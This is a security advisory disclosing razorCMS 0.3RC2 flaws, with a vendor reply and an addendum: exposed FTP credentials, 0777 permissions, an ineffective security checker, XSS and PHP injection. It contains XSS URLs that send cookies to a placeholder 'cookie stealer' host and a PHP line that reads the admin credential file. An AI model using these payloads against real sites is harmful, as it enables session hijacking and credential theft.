Multiple Vulnerability Disclosure for razorCMS
- ----------------------------------------------

A recent security audit has uncovered multiple security
vulnerabilities in the latest version (0.3RC2) and all previous
versions of razorCMS CORE by Morgan Integrated Systems. From the
vendor site: "razorCMS is an open source content management system
written in PHP, using a flat file database structure instead of
having a separate database. It has been released under the GNU
General Public License." <http://razorcms.co.uk>,
<http://en.wikipedia.org/wiki/RazorCMS>

*  The razorCMS install script sets mode 0644 on
admin/core/admin_config.php, which contains the site owner's
cleartext FTP credentials and a sha1sum hash of the site admin
password. Any local user has access to these credentials, and the
admin password can easily be cracked offline (rainbow tables, brute
force, etc). The vendor is planning for the use of stronger file
permissions, two-way encryption for FTP credentials, and stronger
salted hashes for admin passwords in the next release (version 0.4).

*  razorCMS requires a laundry list of files to be mode 0777 for
installation, and promises to correct these permissions after
installation. The razorCMS install script leaves the following
directories in mode 0777 after installation: the razorCMS root
directory, the datastore/ directory, and the admin/core/ directory.
The issue with this should be readily apparent to you. The vendor
is considering fixing the installer in the next release.

*  The razorCMS Security Manager is "used to ensure apache owned
files have safe permissions set." In theory, if the Security
Manager detects any insecure files, it will display a warning
message and instructs the user to click a button to "secure" the
site. By the same token, if all files are found to be secure, the
Security Manager will display "All files are currently safe." The
problem is the Security Manager doesn't actually *do* anything --
it only checks the file permissions of a handful of files, and not
even all of the Apache-owned files like it states. If a user were
to recursively chmod the razorCMS installation to 0777 (which may
be tempting for a novice user to do due to the large number of
files the installer requires to be mode 0777) and then rely on the
Security Manager to secure the site, nearly all files and
directories would be left in mode 0777 and the Security Manager
would report "All files are currently safe." The vendor does not
feel that this tool is broken, just that the phrase "All files" is
misleading and the wording should be changed. I have been
unsuccessful in convincing the vendor that the Security Manager
should *actually* secure the site, so don't expect this to be
fixed. Ever.

*  Several cross-site scripting vulnerabilities have been
discovered in the razorCMS admin section, and will be fixed for the
next release:
<http://yoursite.com/cms/admin/?action=edit&slab=home>'><script>alert(
'<http://yourcookiestealer.org/evil.php?cookie=>'%20+%20encodeURI(docu
ment.cookie)%20+%20'&useragent='%20+%20encodeURI(navigator.userAgent
));</script><form

<http://yoursite.com/cms/admin/?action=showcats&unpub=true&slabID=1&c>
atname=sidebar'><script>alert('<http://yourcookiestealer.org/evil.php>
?cookie='%20+%20encodeURI(document.cookie)%20+%20'&useragent='%20+%2
0encodeURI(navigator.userAgent));</script><form

<http://yoursite.com/cms/admin/?action=reordercat&cat=sidebar>'><scrip
t>alert('<http://yourcookiestealer.org/evil.php?cookie=>'%20+%20encode
URI(document.cookie)%20+%20'&useragent='%20+%20encodeURI(navigator.u
serAgent));</script><form&param=0,1

*  razorCMS has the ability to save content as .php files
(behaviour enabled by default, may be changed in the 'Settings'
area to html). This allows arbitrary PHP code to be injected into
any page, enabling the owner to run commands on the server with the
privileges of the web server. This may also be exploited remotely
through a cross-site request forgery attack: for example, in an
effort to steal user credentials, an authenticated admin may be
tricked into submitting a malicious form that creates a page on
their site containing something like <?php system("cat
../../admin/core/admin_config.php"); ?>. The vendor has no plans to
change this behaviour.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

The following was received this morning from the author of
razorCMS. It seems the threat of full disclosure really expedites
vulnerability remediation ;)

"All XSS attacks are now plugged, this has been solved. The admin
password now uses my own password hashing method that introduces
salt in at a position that is relative to the input password
length, the salt is then appended to the front of the password. ftp
password is now encrypted again using my own algorithum and is only
decrypted using a key stored in session. this way to get ftp
password they have to look at file to get ftp password then hijack
the session that is randomly changing it's session number every
refresh to get the key to unlock it. the whole system now gets
owned by apache, and the security manager has now gone, and been
replaced with security check on main page when loging in, this
checks ALL files and lets you secure ALL files. if any files are
open the big box goes red, so you would have to be blind to miss
it. This will also work for ftp mode too and just checking how much
functionality i can get out of it for windows permissions too.
There is still the option to make all files unsafe, as this can be
invaluble when uninstalling razorCMS, but it is riddled with error
messages and turns the box red, plus it's on the home page so you
will see it every time you login. Login now bans you after X
amounts of tries, for upto 60mins, you can have no more than 8
failied logins in 60mins, if you conceal your IP it will ban you
from logging in. All upto 300 records are stored in a log which
prunes itself to 300 records (all configurable) I have a file
manager to add in the mix too, so theres been a lot of effort here
to tighten things up a hell of a lot. should be about a week or two
then i'll release for testing. It's still got some rough edges."

All razorCMS users are encouraged to upgrade to the latest stable
version (0.4) once its released in "about a week or two."

One thing I accidentally left out of the disclosure below:

*  A permanent XSS vulnerability has been discovered in the "Page
Title" field of the "Create New Page" form, making it vulnerable to
permanent XSS viruses. Any script tags appended to the page title
will be executed on every page view and executed three times every
time the Content Manager is accessed in the admin section.

This presumably has been fixed for the new release per the author's
statement above.
